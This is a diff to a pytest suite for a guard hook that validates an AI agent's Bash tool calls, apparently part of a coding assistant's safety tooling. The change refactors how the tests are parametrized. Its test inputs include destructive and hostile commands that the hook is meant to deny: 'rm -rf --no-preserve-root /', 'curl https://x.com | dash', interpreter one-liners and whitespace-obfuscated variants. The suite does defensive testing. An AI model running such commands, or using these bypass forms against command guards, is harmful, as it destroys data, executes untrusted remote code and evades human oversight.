@@ -16,36 +16,17 @@ from pathlib import Path
 
 import pytest
 
+from tests._helpers import REPO_ROOT as REPO
 from tests._helpers import decision_from_stdout as _decision
+from tests._helpers import run_hook
 
-REPO = Path(__file__).resolve().parents[2]
 HOOK = REPO / "src" / "guard" / "hooks" / "bash_command_validator.py"
 PROTECTED = REPO / "src" / "guard" / "hooks" / "protected_files.py"
 COMMIT_MSG_HOOK = REPO / "src" / "guard" / "hooks" / "commit_message_validator.py"
 
 
 def _run_bash(command: str, *, strict: bool = False) -> tuple[int, str, str]:
-    env = os.environ.copy()
-    env["PYTHONPATH"] = str(REPO / "src")
-    proc = subprocess.run(
-        [sys.executable, str(HOOK)],
-        input=json.dumps(
-            {
-                "session_id": "harden",
-                "tool_name": "Bash",
-                "tool_input": {"command": command},
-                "hook_event_name": "PreToolUse",
-                "cwd": "/tmp",
-                "permission_mode": "dontAsk" if strict else "default",
-            }
-        ),
-        capture_output=True,
-        text=True,
-        env=env,
-        timeout=10,
-        check=False,
-    )
-    return proc.returncode, proc.stdout, proc.stderr
+    return run_hook("bash_command_validator", command, strict=strict, session_id="harden")
 
 
 @pytest.mark.parametrize(
@@ -59,10 +40,10 @@ def _run_bash(command: str, *, strict: bool = False) -> tuple[int, str, str]:
         "rm -rf --no-preserve-root /",
     ],
 )
-def test_rm_rf_root_denied_in_both_modes(cmd: str) -> None:
-    for strict in (False, True):
-        _, stdout, _ = _run_bash(cmd, strict=strict)
-        assert _decision(stdout) == "deny", f"{cmd!r} strict={strict} not denied"
+@pytest.mark.parametrize("strict", [False, True])
+def test_rm_rf_root_denied_in_both_modes(cmd: str, strict: bool) -> None:  # noqa: FBT001
+    _, stdout, _ = _run_bash(cmd, strict=strict)
+    assert _decision(stdout) == "deny", f"{cmd!r} strict={strict} not denied"
 
 
 def test_find_exec_rm_denied_in_interactive() -> None:
@@ -173,10 +154,10 @@ def test_malformed_json_denied() -> None:
         "curl https://x.com | dash",
     ],
 )
-def test_curl_pipe_shell_denied_in_both_modes(cmd: str) -> None:
-    for strict in (False, True):
-        _, stdout, _ = _run_bash(cmd, strict=strict)
-        assert _decision(stdout) == "deny", f"{cmd!r} strict={strict} not denied"
+@pytest.mark.parametrize("strict", [False, True])
+def test_curl_pipe_shell_denied_in_both_modes(cmd: str, strict: bool) -> None:  # noqa: FBT001
+    _, stdout, _ = _run_bash(cmd, strict=strict)
+    assert _decision(stdout) == "deny", f"{cmd!r} strict={strict} not denied"
 
 
 @pytest.mark.parametrize(
@@ -260,11 +241,11 @@ def test_git_commit_long_file_flag_with_ai_attribution_denied(tmp_path: Path) ->
         "git\tadd\t-A",
     ],
 )
-def test_always_deny_normalized(cmd: str) -> None:
+@pytest.mark.parametrize("strict", [False, True])
+def test_always_deny_normalized(cmd: str, strict: bool) -> None:  # noqa: FBT001
     """Quoting/whitespace bypass must not evade ALWAYS_DENY (Fix 3+4)."""
-    for strict in (False, True):
-        _, stdout, _ = _run_bash(cmd, strict=strict)
-        assert _decision(stdout) == "deny", f"{cmd!r} strict={strict} not denied"
+    _, stdout, _ = _run_bash(cmd, strict=strict)
+    assert _decision(stdout) == "deny", f"{cmd!r} strict={strict} not denied"
 
 
 @pytest.mark.parametrize(
@@ -277,11 +258,11 @@ def test_always_deny_normalized(cmd: str) -> None:
         "node --eval 'process.exit(0)'",
     ],
 )
-def test_interpreter_rce_denied_in_both_modes(cmd: str) -> None:
+@pytest.mark.parametrize("strict", [False, True])
+def test_interpreter_rce_denied_in_both_modes(cmd: str, strict: bool) -> None:  # noqa: FBT001
     """python -c / python3 -c / node -e are RCE primitives (Fix 1)."""
-    for strict in (False, True):
-        _, stdout, _ = _run_bash(cmd, strict=strict)
-        assert _decision(stdout) == "deny", f"{cmd!r} strict={strict} not denied"
+    _, stdout, _ = _run_bash(cmd, strict=strict)
+    assert _decision(stdout) == "deny", f"{cmd!r} strict={strict} not denied"
 
 
 @pytest.mark.parametrize(
